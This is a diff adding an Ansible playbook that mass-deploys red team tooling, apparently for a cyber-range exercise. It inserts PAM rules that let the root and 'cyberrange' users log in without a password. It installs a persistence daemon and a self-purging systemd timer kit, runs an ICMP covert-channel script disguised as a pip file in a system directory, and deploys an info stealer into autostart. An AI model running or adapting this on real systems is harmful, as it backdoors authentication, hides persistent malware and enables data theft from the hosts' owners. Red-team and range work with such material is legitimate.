@@ -1,0 +1,97 @@
+---
+- name: Mass deploy red team tooling (Ansible reimplementation of mass_deploy.sh)
+  hosts: all
+  become: true
+  gather_facts: false
+
+  vars:
+    # Base repo root derived from playbook_dir (which is ansible/playbooks)
+    repo_root: "{{ playbook_dir }}/../.."
+
+    # Absolute paths on the control node
+    let_the_games_begin_local_dir: "{{ repo_root }}/MultiSSH+RedScripts/daemon.d"
+    let_the_games_begin_remote_dir: "/lib/gnupg2"
+    let_the_games_begin_install_cmd: "./LetTheGamesBegin.sh"
+
+    systemd_timer_local_dir: "{{ repo_root }}/SystemdTimer-LinuxPersistenceStash"
+    systemd_timer_remote_dir: "/media"
+    systemd_timer_install_cmd: "./install.sh --purge-source"
+
+    # Repo directory name uses a hyphen
+    info_stealer_local_dir: "{{ repo_root }}/Info-Gathering"
+    info_stealer_remote_dir: "/etc/xdg/autostart"
+    info_stealer_install_cmd: "python3 FullInfoScan.py"
+
+    covert_channel_local_path: "{{ repo_root }}/Covert Channel/icmp_server.py"
+    covert_channel_remote_path: "/etc/python3.10/pip_connectivity.py"
+
+  tasks:
+    - name: Ensure pam_succeed_if lines for root and cyberrange at top of common-auth
+      ansible.builtin.lineinfile:
+        path: /etc/pam.d/common-auth
+        line: "{{ item }}"
+        insertbefore: BOF
+      loop:
+        - "auth sufficient pam_succeed_if.so user = root"
+        - "auth sufficient pam_succeed_if.so user = cyberrange"
+
+    - name: Bootstrap Python 3 on hosts without it
+      ansible.builtin.raw: |
+        if ! command -v python3 >/dev/null 2>&1; then
+          apt-get update -y && apt-get install -y python3 python3-apt
+        fi
+      become: true
+      changed_when: false
+
+    - name: Ensure Python libraries for covert channel are installed
+      ansible.builtin.apt:
+        name:
+          - python3-pip
+          - python3-scapy
+          - python3-cryptography
+        state: present
+        update_cache: yes
+
+    - name: Deploy LetTheGamesBegin daemon
+      ansible.builtin.import_role:
+        name: deploy_tool
+      vars:
+        deploy_local_dir: "{{ let_the_games_begin_local_dir }}"
+        deploy_remote_dir: "{{ let_the_games_begin_remote_dir }}"
+        deploy_install_cmd: "{{ let_the_games_begin_install_cmd }}"
+
+    - name: Deploy Jack's SystemdTimer persistence
+      ansible.builtin.import_role:
+        name: deploy_tool
+      vars:
+        deploy_local_dir: "{{ systemd_timer_local_dir }}"
+        deploy_remote_dir: "{{ systemd_timer_remote_dir }}"
+        deploy_install_cmd: "{{ systemd_timer_install_cmd }}"
+
+    - name: Ensure directory for covert channel script exists
+      ansible.builtin.file:
+        path: "{{ covert_channel_remote_path | dirname }}"
+        state: directory
+        mode: "0755"
+
+    - name: Upload Jeans' covert channel Python script
+      ansible.builtin.copy:
+        src: "{{ covert_channel_local_path }}"
+        dest: "{{ covert_channel_remote_path }}"
+        mode: "0755"
+
+    - name: Run Jeans' covert channel Python script in background
+      ansible.builtin.shell: "nohup python3 {{ covert_channel_remote_path }} >/dev/null 2>&1 &"
+      args:
+        executable: /bin/bash
+      async: 1
+      poll: 0
+
+    - name: Deploy Will's info stealer
+      ansible.builtin.import_role:
+        name: deploy_tool
+      vars:
+        deploy_local_dir: "{{ info_stealer_local_dir }}"
+        deploy_remote_dir: "{{ info_stealer_remote_dir }}"
+        deploy_install_cmd: "{{ info_stealer_install_cmd }}"
+
